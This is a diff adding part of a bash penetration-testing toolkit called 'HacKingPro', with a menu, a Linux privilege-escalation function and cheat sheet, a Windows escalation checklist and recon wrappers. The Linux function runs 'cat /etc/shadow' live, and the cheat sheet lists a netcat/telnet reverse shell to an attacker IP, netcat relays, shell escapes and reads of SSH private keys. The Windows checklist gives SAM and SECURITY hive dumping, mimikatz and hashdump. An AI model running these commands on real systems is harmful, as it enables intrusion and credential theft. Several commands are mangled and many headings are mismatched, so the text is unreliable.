+    ${DGrey}${faintT}┌╼ ${resetT}${BRed}[${BCyan} WinPrivPro ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan}${faintT} Windows Privilege Proffesional ${resetT}${BRed}]
+    ${DGrey}${faintT}┖───╼ ${resetT}${BRed}[${BCyan} WPP ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan}${faintT} WinPrivPro ${resetT}${BRed}]
+
+    ${DGrey}${faintT}┌╼ ${resetT}${BRed}[${ORANGE} LinPrivPro ${BRed}]${BYellow}╼▰  ${BRed}[${ORANGE}${faintT} Linux Privilege Proffesional ${resetT}${BRed}]
+    ${DGrey}${faintT}┖─┲─╼ ${resetT}${BRed}[${ORANGE} LPP ${BRed}]${BYellow}╼▰  ${BRed}[${ORANGE}${faintT} LinPrivPro ${resetT}${BRed}]
+    ${DGrey}${faintT}  ┖─╼ ${resetT}${BRed}[${ORANGE} FLP ${BRed}]${BYellow}╼▰  ${BRed}[${ORANGE}${faintT} FunLinPEAS ${resetT}${BRed}]
+
+    ${DGrey}${faintT}─╼ ${resetT}${resetT}${BRed}[${DGrey} X ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $(AnLoMinus) ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Privilege Escalation ${BRed}]${BYellow}╼▰  ${BGreen}   ")
+
+    read -p "$HacKingProMenuMain" cmd
+    case $cmd in
+      lpp|LPP )
+      File_LinPrivPro="${MainDirectoriyCaseNameLocal}/${targetNAME}-HacKingPro-LinPrivPro-Log.md"  # Define Recon File
+      LinPrivPro >> ${File_LinPrivPro}
+      less -R ${File_LinPrivPro}
+      Press_ENTER
+      ;;
+      lpe|LPE )
+      LinPrivEsc
+      Press_ENTER
+      ;;
+      "?"|help|about|About )
+      about
+      Press_ENTER
+      ;;
+      arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
+      Arsenal
+      ;;
+      p|P )
+      HacKingProPlanning
+      Press_ENTER
+      ;;
+      x|X|exit|EXIT )
+      cd ${MainDirectoriy}
+      clear
+      AwesomeLineExit
+      break
+      ;;
+    esac
+  done
+
+}
+#--╼[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰[ Privileg Escalation ]--╼▰[ Linux ]--╼▰[ LinPrivPro ]
+LinPrivPro(){
+  echo "${ORANGE}#  • Linux Privilege Escalation Enumeration Cheat Sheet:"
+  echo "\n"
+  echo "     ${ORANGE}# info on current user on linux"
+  echo "\n"
+  id
+  echo "\n"
+  echo "     ${ORANGE}# printsallusernamesandpasswordhashes"
+  echo "\n"
+  cat /etc/shadow
+  echo "\n"
+  echo "     ${ORANGE}# provideshostname"
+  echo "\n"
+  hostname
+  cat /etc/issue
+  cat /etc/*-release
+  echo "\n"
+  echo "     ${ORANGE}# kernel version and architecture"
+  echo "\n"
+  uname -a
+  echo "\n"
+  echo "     ${ORANGE}# prints running processes and users running them in user readable"
+  echo "\n"
+  ps axu
+  echo "${ORANGE}#  format"
+  echo "\n"
+  echo "     ${ORANGE}# tcp/ip config of all interfaces and shows all information"
+  echo "\n"
+  ip a
+  echo "\n"
+  echo "     ${ORANGE}# routingtable"
+  echo "\n"
+  /sbin/routeor/sbin/routel
+  echo "\n"
+  echo "     ${ORANGE}# listallnetworkconnectionsandsessions"
+  echo "\n"
+  ss-anp
+  echo "\n"
+  echo "     ${ORANGE}# looks for iptables commands"
+  echo "\n"
+  grep -Hs iptables /etc/*
+  echo "\n"
+  echo "     ${ORANGE}# printstheserules"
+  echo "\n"
+  cat /etc/iptables-backup
+  echo "\n"
+  echo "     ${ORANGE}# dailytasks"
+  echo "\n"
+  cat /etc/cron.daily
+  echo "\n"
+  echo "     ${ORANGE}# weeklytasks"
+  echo "\n"
+  cat /etc/cron.weekly
+  echo "\n"
+  echo "     ${ORANGE}# system admin added tasks with potentially insecure"
+  echo "\n"
+  cat /et/crontab
+
+  echo "${ORANGE}#  permissions"
+
+  echo "     ${ORANGE}# list installed packages"
+  dpkg -l
+
+  echo "     ${ORANGE}# list installed packages on redhat linux"
+  yum list installed
+
+  echo "     ${ORANGE}# looks for world writable directories o mount = prints all drives mounted"
+  find / -writable -type d 2>/dev/null
+
+  echo "     ${ORANGE}# alldrivesmountedatboottime"
+  cat /etc/fstab
+
+  echo "     ${ORANGE}# partition information, try to mount them if unmounted"
+  /bin/lsblk
+
+  echo "     ${ORANGE}# listloadedmodules"
+  lsmod
+
+  echo "     ${ORANGE}# moreinfoaboutmodule"
+  /sbin/modinfomodulename
+
+##############################
+AwesomeLine "(Linux) Privilege Escalation"
+
+    echo " ${DGrey}┌───────╼ ${BRed}[${BYellow} (Linux) Privilege Escalation ${BRed}]"
+    echo " ${DGrey}|"
+    echo " ${DGrey}|──╼ ${BRed}[${ORANGE} [00] Collect  ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Enumeration, more enumeration and some more enumeration. ${BRed}]"
+    echo " ${DGrey}|──╼ ${BRed}[${ORANGE} [01] Process  ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Sort through data, analyse and prioritisation. ${BRed}]"
+    echo " ${DGrey}|──╼ ${BRed}[${ORANGE} [02] Search  ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Know what to search for and where to find the exploit code. ${BRed}]"
+    echo " ${DGrey}|──╼ ${BRed}[${ORANGE} [03] Adapt  ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Customize the exploit, so it fits. Not every exploit work for every system "out of the box". ${BRed}]"
+    echo " ${DGrey}|──╼ ${BRed}[${ORANGE} [04] Try  ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Get ready for (lots of) trial and error. ${BRed}]"
+    echo " ${DGrey}|"
+    echo " ${DGrey}└──╼"
+
+
+    echo "    ${DGrey}┌───────╼ ${BRed}[${BYellow} Operating System ${BRed}]"
+    echo "    ${DGrey}|"
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} What's the distribution type? What version? ${BRed}]${BYellow}╼▰ "
+    echo "
+    #
+    # cat /etc/issue
+    # cat /etc/*-release
+    # cat /etc/lsb-release
+    # cat /etc/redhat-release
+    #
+    "
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} What's the Kernel version? Is it 64-bit? ${BRed}]${BYellow}╼▰ "
+    echo "
+    #
+    # cat /proc/version
+    # uname -a
+    # uname -mrs
+    # rpm -q kernel
+    # dmesg | grep Linux
+    # ls /boot | grep vmlinuz-
+    #
+    "
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} What can be learnt from the environmental variables? ${BRed}]${BYellow}╼▰ "
+    echo "
+    # cat /etc/profile
+    # cat /etc/bashrc
+    # cat ~/.bash_profile
+    # cat ~/.bashrc
+    # cat ~/.bash_logout
+    # env
+    # set
+    "
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰ "
+    lpstat -a
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Applications & Services ${BRed}]${BYellow}╼▰   What services are running? Which service has which user privilege? "
+    echo "
+    #
+    # ps aux
+    # ps -ef
+    # top
+    # cat /etc/service
+    #
+    "
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Which service(s) are been running by root? Of these services, which are vulnerable ${BRed}]${BYellow}╼▰  it's worth a double check!"
+    echo "
+    #
+    # ps aux | grep root
+    # ps -ef | grep root
+    #
+    "
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} What applications are installed? What version are they? Are they currently running? ${BRed}]${BYellow}╼▰"
+    echo "
+    #
+    # ls -alh /usr/bin/
+    # ls -alh /sbin/
+    # dpkg -l
+    # rpm -qa
+    # ls -alh /var/cache/apt/archivesO
+    # ls -alh /var/cache/yum/
+    #
+    "
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Any of the service(s) settings misconfigured? ${BRed}]${BYellow}╼▰  Are any (vulnerable) plugins attached?"
+    echo "
+    #
+    # cat /etc/syslog.conf
+    # cat /etc/chttp.conf
+    # cat /etc/lighttpd.conf
+    # cat /etc/cups/cupsd.conf
+    # cat /etc/inetd.conf
+    # cat /etc/apache2/apache2.conf
+    # cat /etc/my.conf
+    # cat /etc/httpd/conf/httpd.conf
+    # cat /opt/lampp/etc/httpd.conf
+    # # ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
+    #
+    "
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} What jobs are scheduled? ${BRed}]${BYellow}╼▰  "
+    echo "
+    #
+    # crontab -l
+    # ls -alh /var/spool/cron
+    # ls -al /etc/ | grep cron
+    # ls -al /etc/cron*
+    # cat /etc/cron*
+    # cat /etc/at.allow
+    # cat /etc/at.deny
+    # cat /etc/cron.allow
+    # cat /etc/cron.deny
+    # cat /etc/crontab
+    # cat /etc/anacrontab
+    # cat /var/spool/cron/crontabs/root
+    #
+    "
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
+    echo '
+    #
+    # Any plain text usernames and/or passwords?
+    # grep -i user [filename]
+    # grep -i pass [filename]
+    # grep -C 5 "password" [filename]
+    # find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
+    #
+    '
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a Communications & NetWorKing? ${BRed}]${BYellow}╼▰"
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} What NIC(s) does the system have? Is it connected to another network? ${BRed}]${BYellow}╼▰"
+    echo "
+    #
+    # ifconfig -a
+    # cat /etc/network/interfaces
+    # cat /etc/sysconfig/network
+    #
+    "
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} What are the network configuration settings?  ${BRed}]${BYellow}╼▰"
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} What can you find out about this network?${BRed}]${BYellow}╼▰"
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} DHCP server? DNS server? Gateway? ${BRed}]${BYellow}╼▰"
+    echo "
+    #
+    # cat /etc/resolv.conf
+    # cat /etc/sysconfig/network
+    # cat /etc/networks
+    # iptables -L
+    # hostname
+    # dnsdomainname
+    #
+    "
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} What other users & hosts are communicating with the system? ${BRed}]${BYellow}╼▰"
+    echo "
+    #
+    # lsof -i
+    # lsof -i :80
+    # grep 80 /etc/services
+    # netstat -antup
+    # netstat -antpx
+    # netstat -tulpn
+    # chkconfig --list
+    # chkconfig --list | grep 3:on
+    # last
+    # w
+    #
+    "
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Whats Cached? IP and/or MAC addresses ${BRed}]${BYellow}╼▰"
+    echo "
+    #
+    # arp -e
+    # route
+    # /sbin/route -nee
+    #
+    "
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is packet sniffing possible? What can be seen? Listen to live traffic ${BRed}]${BYellow}╼▰"
+    echo "
+    #
+    # Is packet sniffing possible? What can be seen? Listen to live traffic
+    # tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
+    # tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
+    #
+    "
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
+    echo "
+    #
+    # Have you got a shell? Can you interact with the system?
+    # # http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
+    # nc -lvp 4444    # Attacker. Input (Commands)
+    # nc -lvp 4445    # Attacker. Ouput (Results)
+    # telnet [atackers ip] 4444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
+    #
+    "
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is port forwarding possible? Redirect and interact with traffic from another view ${BRed}]${BYellow}╼▰"
+    echo "
+    #
+    # rinetd
+    # http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
+    "
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
+    # fpipe
+    # FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
+    # FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
+    # # ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
+    # ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
+    # ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
+    # # mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
+    # mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
+    # mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
+    # mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
+    # Is tunnelling possible? Send commands locally, remotely
+    # ssh -D 127.0.0.1:9050 -N [username]@[ip]
+    # proxychains ifconfig
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Confidential Information & Users ${BRed}]${BYellow}╼▰"
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Who are you? ${BRed}]${BYellow}╼▰"
+    # id
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Who is logged in? ${BRed}]${BYellow}╼▰"
+    # who
+    # w
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Who has been logged in? ${BRed}]${BYellow}╼▰"
+    # last
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Who else is there? Who can do what? ${BRed}]${BYellow}╼▰"
+    # cat /etc/passwd | cut -d:    # List of users
+    # grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
+    # awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
+    # cat /etc/sudoers
+    # sudo -l
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} sensitive files can be found? ${BRed}]${BYellow}╼▰"
+    # What sensitive files can be found?
+    # cat /etc/passwd
+    # cat /etc/group
+    # cat /etc/shadow
+    # ls -alh /var/mail/
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Anything 'interesting' in the home directorie(s)? ${BRed}]${BYellow}╼▰"
+    #  If its possible to access
+    # ls -ahlR /root/
+    # ls -ahlR /home/
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Are there any passwords in; scripts, databases, configuration files or log files? ${BRed}]${BYellow}╼▰"
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Default paths and locations for passwords ${BRed}]${BYellow}╼▰"
+    # cat /var/apache2/config.inc
+    # cat /var/lib/mysql/mysql/user.MYD
+    # cat /root/anaconda-ks.cfg
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} What has the user being doing? ${BRed}]${BYellow}╼▰"
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there any password in plain text? ${BRed}]${BYellow}╼▰"
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} What have they been edting? ${BRed}]${BYellow}╼▰"
+    # cat ~/.bash_history
+    # cat ~/.nano_history
+    # cat ~/.atftp_history
+    # cat ~/.mysql_history
+    # cat ~/.php_history
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} What user information can be found? ${BRed}]${BYellow}╼▰"
+    # cat ~/.bashrc
+    # cat ~/.profile
+    # cat /var/mail/root
+    # cat /var/spool/mail/root
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Can private-key information be found? ${BRed}]${BYellow}╼▰"
+    # cat ~/.ssh/authorized_keys
+    # cat ~/.ssh/identity.pub
+    # cat ~/.ssh/identity
+    # cat ~/.ssh/id_rsa.pub
+    # cat ~/.ssh/id_rsa
+    # cat ~/.ssh/id_dsa.pub
+    # cat ~/.ssh/id_dsa
+    # cat /etc/ssh/ssh_config
+    # cat /etc/ssh/sshd_config
+    # cat /etc/ssh/ssh_host_dsa_key.pub
+    # cat /etc/ssh/ssh_host_dsa_key
+    # cat /etc/ssh/ssh_host_rsa_key.pub
+    # cat /etc/ssh/ssh_host_rsa_key
+    # cat /etc/ssh/ssh_host_key.pub
+    # cat /etc/ssh/ssh_host_key
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} File Systems ${BRed}]${BYellow}╼▰"
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Which configuration files can be written in /etc/? ${BRed}]${BYellow}╼▰"
+    # ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
+    # ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
+    # ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
+    # ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Able to reconfigure a service? ${BRed}]${BYellow}╼▰"
+    # find /etc/ -readable -type f 2>/dev/null                         # Anyone
+    # find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} What can be found in /var/ ? ${BRed}]${BYellow}╼▰"
+    # ls -alh /var/log
+    # ls -alh /var/mail
+    # ls -alh /var/spool
+    # ls -alh /var/spool/lpd
+    # ls -alh /var/lib/pgsql
+    # ls -alh /var/lib/mysql
+    # cat /var/lib/dhcp3/dhclient.leases
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Any settings/files (hidden) on website? ${BRed}]${BYellow}╼▰"
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Any settings file with database information? ${BRed}]${BYellow}╼▰"
+    # ls -alhR /var/www/
+    # ls -alhR /var/www/html/
+    # ls -alhR /srv/www/htdocs/
+    # ls -alhR /opt/lampp/htdocs/
+    # ls -alhR /usr/local/www/apache22/data/
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there anything in the log file(s) ${BRed}]${BYellow}╼▰"
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} (Could help with 'Local File Includes'!) ${BRed}]${BYellow}╼▰"
+    # # http://www.thegeekstuff.com/2011/08/linux-var-log-files/
+    # cat /etc/httpd/logs/access_log
+    # cat /etc/httpd/logs/access.log
+    # cat /etc/httpd/logs/error_log
+    # cat /etc/httpd/logs/error.log
+    # cat /var/log/apache2/access_log
+    # cat /var/log/apache2/access.log
+    # cat /var/log/apache2/error_log
+    # cat /var/log/apache2/error.log
+    # cat /var/log/apache/access_log
+    # cat /var/log/apache/access.log
+    # cat /var/log/auth.log
+    # cat /var/log/chttp.log
+    # cat /var/log/cups/error_log
+    # cat /var/log/dpkg.log
+    # cat /var/log/faillog
+    # cat /var/log/httpd/access_log
+    # cat /var/log/httpd/access.log
+    # cat /var/log/httpd/error_log
+    # cat /var/log/httpd/error.log
+    # cat /var/log/lastlog
+    # cat /var/log/lighttpd/access.log
+    # cat /var/log/lighttpd/error.log
+    # cat /var/log/lighttpd/lighttpd.access.log
+    # cat /var/log/lighttpd/lighttpd.error.log
+    # cat /var/log/messages
+    # cat /var/log/secure
+    # cat /var/log/syslog
+    # cat /var/log/wtmp
+    # cat /var/log/xferlog
+    # cat /var/log/yum.log
+    # cat /var/run/utmp
+    # cat /var/webmin/miniserv.log
+    # cat /var/www/logs/access_log
+    # cat /var/www/logs/access.log
+    # ls -alh /var/lib/dhcp3/
+    # ls -alh /var/log/postgresql/
+    # ls -alh /var/log/proftpd/
+    # ls -alh /var/log/samba/
+    # auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
+    # If commands are limited, you break out of the "jail" shell?
+    # python -c 'import pty;pty.spawn("/bin/bash")'
+    # echo os.system('/bin/bash')
+    # /bin/sh -i
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
+    # How are file-systems mounted?
+    # mount
+    # df -h
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Are there any unmounted file-systems? ${BRed}]${BYellow}╼▰"
+    # cat /etc/fstab
+    echo "{DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
+    # What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
+    # find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
+    # find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
+    # find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Looks in 'common' places ${BRed}]${BYellow}╼▰"
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} :/bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search) ${BRed}]${BYellow}╼▰"
+    # for i in `locate -r "bin$"`; do
+      # find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+      # find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null;
+    # done
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
+    # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+    # find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Where can written to and executed from? ${BRed}]${BYellow}╼▰"
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} A few 'common' places: /tmp, /var/tmp, /dev/shm ${BRed}]${BYellow}╼▰"
+    echo "
+    #
+    # find / -writable -type d 2>/dev/null     # world-writeable folders
+    # find / -perm -222 -type d 2>/dev/null    # world-writeable folders
+    # find / -perm -o+w -type d 2>/dev/null    # world-writeable folders
+    # find / -perm -o+x -type d 2>/dev/null    # world-executable folders
+    # find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
+    #
+    "
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Any 'problem' files? Word-writeable, 'nobody' files ${BRed}]${BYellow}╼▰"
+    echo "
+    #
+    # find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+    # find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+    #
+    "
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} What development tools/languages are installed/supported? ${BRed}]${BYellow}╼▰"
+    echo "
+    #
+    # find / -name perl*
+    # find / -name python*
+    # find / -name gcc*
+    # find / -name cc
+    #
+    "
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} How can files be uploaded? ${BRed}]${BYellow}╼▰"
+    echo "
+    #
+    # find / -name wget
+    # find / -name nc*
+    # find / -name netcat*
+    # find / -name tftp*
+    # find / -name ftp
+    #
+    "
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Finding exploit code ${BRed}]${BYellow}╼▰"
+    #
+    # http://www.exploit-db.com
+    # http://1337day.com
+    # http://www.securiteam.com
+    # http://www.securityfocus.com
+    # http://www.exploitsearch.net
+    # http://metasploit.com/modules/
+    # http://securityreason.com
+    # http://seclists.org/fulldisclosure/
+    # http://www.google.com
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Finding more information regarding the exploit ${BRed}]${BYellow}╼▰"
+    #
+    # http://www.cvedetails.com
+    # http://packetstormsecurity.org/files/cve/[CVE]
+    # http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
+    # http://www.vulnview.com/cve-details.php?cvename=[CVE]
+}
+#--╼[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰[ Privileg Escalation ]--╼▰[ Windows ]
+WinPrivPro(){
+
+  # Now we start the whole enumeration-process over gain.
+  # This is a checklist. You need to check of every single one, in this order.
+  echo "
+  - OS:
+    - Look for hotfixes
+      - systeminfo:
+      - wmic qfe get Caption,Description,HotFixID,InstalledOn
+      - set
+  - Version:
+  - Architecture:
+  - Current user:
+  - Hotfixes:
+  - Antivirus:
+
+  - Kernel exploits
+  - Cleartext password
+  - Reconfigure service parameters
+  - Inside service
+  - Program running as root
+  - Installed software
+  - Scheduled tasks
+  - Weak passwords
+
+  - Users
+    - hostname
+    - net users
+    - net user user1
+    - accesschk.exe -uwcqv 'Authenticated Users' *
+
+  - LocalGroups
+    - net localgroups
+
+  - netsh firewall show state
+  - netsh firewall show config
+
+  - Set path
+    - set PATH=%PATH%;C:\xampp\php
+
+    ### Cleartext passwords
+
+  - Windows autologin
+    - reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon'
+
+  - VNC
+    - reg query 'HKCU\Software\ORL\WinVNC3\Password'
+
+  - SNMP Parameters
+    - reg query 'HKLM\SYSTEM\Current\ControlSet\Services\SNMP'
+
+  - Putty
+    - reg query 'HKCU\Software\SimonTatham\PuTTY\Sessions'
+
+  - Search for password in registry
+    - reg query HKLM /f password /t REG_SZ /s
+    - reg query HKCU /f password /t REG_SZ /s
+
+  - Installed software
+    - Metasploit
+      - ps
+      - tasklist /SVC
+      - net start
+      - reg query HKEY_LOCAL_MACHINE\SOFTWARE
+      - DRIVERQUERY
+    - Look in:
+      - C:\Program files
+      - C:\Program files (x86)
+    Home directory of the user
+
+  - Interesting files
+    - Meterpreter
+      - search -f *.txt
+      - search -f *.zip
+      - search -f *.doc
+      - search -f *.xls
+      - search -f config*
+      - search -f *.rar
+      - search -f *.docx
+      - search -f *.sql
+    - How to cat files in meterpreter
+      - cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt
+    - Recursive search
+      - dir /s
+
+    - Passwords and hashes
+      - wce32.exe -w
+      - wce64.exe -w
+      - fgdump.exe
+      - reg.exe save hklm\sam c:\sam_backup
+      - reg.exe save hklm\security c:\security_backup
+      - reg.exe save hklm\system c:\system
+      - Meterpreter
+        - hashdump
+        - load mimikatz
+        - msv
+
+  - Browser
+    - Browser start-page:
+    - Browser-history:
+    - Saved passwords:
+
+  "
+
+}
+################################################################
+#------╼╼▰[ Main Menu ]--╼▰[ Privileg Escalation ]--╼▰ [ End ] #
+################################################################
+################################################
+#------╼╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [ End ] #
+################################################
+
+
+HacKingPro_Recon(){
+  HKP_nmap(){
+    nmap -sV -T3 -Pn -p2075,2076,6443,3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,443,7447,7080,8880,8983,5673,7443,19000,19080 $1
+  }
+  HKP_findomain(){
+    findomain -t $1
+  }
+  HKP_ffuf(){
+    ffuf -u $1/FUZZ -w ~/tools/dirsearch/db/dicc.txt -mc 200,301,302 -t 50
+  }
+  HKP_ffufapi(){
+    ffuf -u $1/FUZZ -w ~/tools/dirsearch/db/apiwords.txt -mc 200 -t 50
+  }
+  HKP_arjun(){
+    cd ~/tools/Arjun
+    python3 arjun.py -u $1
+    cd -
+  }
+  HKP_am(){
+    amass enum --passive -d $1 -json $1.json
+    jq .name $1.json | sed "s/\"//g"| httprobe -c 60 | tee -a $1-domains.txt
+  }
+  HKP_sqlmap(){
+    sqlmap -u $1
+  }
+  HKP_ipinfo(){
+    curl ipinfo.io/$1
+  }
+  HKP_s3ls(){
+    aws s3 ls s3://$1
+  }
+  HKP_s3cp(){
+    aws s3 cp $2 s3://$1
+  }
+  HKP_crtsh(){
+    curl -s https://crt.sh/?Identity=%.$1 | grep ">*.$1" | sed 's/<[/]*[TB][DR]>/\n/g' | grep -vE "<|^[\*]*[\.]*$1" | sort -u | awk 'NF'
+  }
+  HKP_certprobe(){
+    curl -s https://crt.sh/\?q\=\%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httprobe | tee -a ./all.txt
+  }
+  HKP_certspotter(){
+    curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1
+  }
+  HKP_certnmap(){
+    curl https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1  | nmap -T5 -Pn -sS -i - - $1
+  }
+  HKP_mscan(){
